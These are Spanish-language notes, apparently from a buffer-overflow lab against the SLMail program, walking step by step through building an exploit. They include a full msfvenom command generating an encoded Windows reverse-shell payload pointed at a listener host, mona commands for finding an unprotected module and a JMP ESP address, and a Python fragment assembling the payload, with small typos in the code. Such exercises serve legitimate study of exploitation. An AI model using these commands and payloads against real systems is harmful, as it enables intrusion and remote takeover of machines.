## Crear un shellcode

```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.111.45 LPORT=443 -f py -e x86/shikata_ga_nai EXITFUNC=thread -b '\x00\x0a\x0d'
```
- Usa un encoder polimorfico `-e x86/shikata_ga_nai`

```
msfvenom -l payloads
```
- Para buscar todos los payloads existentes

- Modificamos el python
```
shellcode = todo el codigo de msfvenom
payload = before_eip + eip + shellcode
```

### Buscamos un modulo inseguro
- Debemos buscar un registro con `!mona modules` del programa slmail que tenga tornado a false casi todos sus controles
```
programa de metasploit-framework nasm_shell.rb
buscamos -> jmp ESP
Nos muestra -> FFE4
Pero en realidad es -> \xFF\xE4
```

### Obtener jmp al ESP
- Dentro de mona `!mona find` o para conocer mas
`!mona help find`
- `!mona find -s '\xFF\xE4' -m SLMFC.DDL`
- Buscamos un patron dentro del modulo que tenga el jump pero ningun badchars detectado antes
- Copiamos la direccion en EIP del programa.

### Reestructuramos el exploit.py
```python 
from structu import pack

eip = pack('<L>', ESE_VALOR)
```
- **ese valor** tiene que estar al reves pero con pack ya se arregla.
- Podemos buscar ese valor en el inmunity debugger y confirmar que es una instruccion de jump.


